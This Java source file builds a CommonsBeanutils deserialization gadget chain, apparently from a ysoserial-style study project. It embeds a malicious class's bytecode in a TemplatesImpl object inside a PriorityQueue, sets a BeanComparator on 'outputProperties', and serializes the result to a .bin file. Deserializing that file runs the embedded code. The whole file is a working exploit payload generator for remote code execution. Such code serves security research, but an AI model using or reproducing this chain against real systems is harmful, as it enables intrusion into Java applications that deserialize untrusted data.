package org.su18.serialize.yoserial.CommonBeanUtils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.su18.serialize.yoserial.Utils.SerializeUtil;

import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author su18
 */
public class CommonBeanUtils {

	public static String fileName = "CommonBeanUtils.bin";

	public static void main(String[] args) throws Exception {

		// 读取恶意类 bytes[]
		InputStream inputStream = CommonBeanUtils.class.getResourceAsStream("../../test/EvilClass.class");
		byte[]      bytes       = new byte[inputStream.available()];
		inputStream.read(bytes);

		// 初始化 PriorityQueue
		PriorityQueue<Object> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		// 初始化 TemplatesImpl 对象
		TemplatesImpl tmpl      = new TemplatesImpl();
		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
		bytecodes.setAccessible(true);
		bytecodes.set(tmpl, new byte[][]{bytes});
		// _name 不能为空
		Field name = TemplatesImpl.class.getDeclaredField("_name");
		name.setAccessible(true);
		name.set(tmpl, "su18");

		// 反射将 TemplatesImpl 放在 PriorityQueue 里
		Field field = PriorityQueue.class.getDeclaredField("queue");
		field.setAccessible(true);
		Object[] objects = (Object[]) field.get(queue);
		objects[0] = tmpl;

		// 初始化 String$CaseInsensitiveComparator
		Class       c           = Class.forName("java.lang.String$CaseInsensitiveComparator");
		Constructor constructor = c.getDeclaredConstructor();
		constructor.setAccessible(true);

		// 初始化 BeanComparator
		BeanComparator beanComparator = new BeanComparator("outputProperties", (Comparator<?>) constructor.newInstance());

		// 反射将 BeanComparator 写入 PriorityQueue 中
		Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field2.setAccessible(true);
		field2.set(queue, beanComparator);

		SerializeUtil.writeObjectToFile(queue, fileName);
		SerializeUtil.readFileObject(fileName);
	}
}
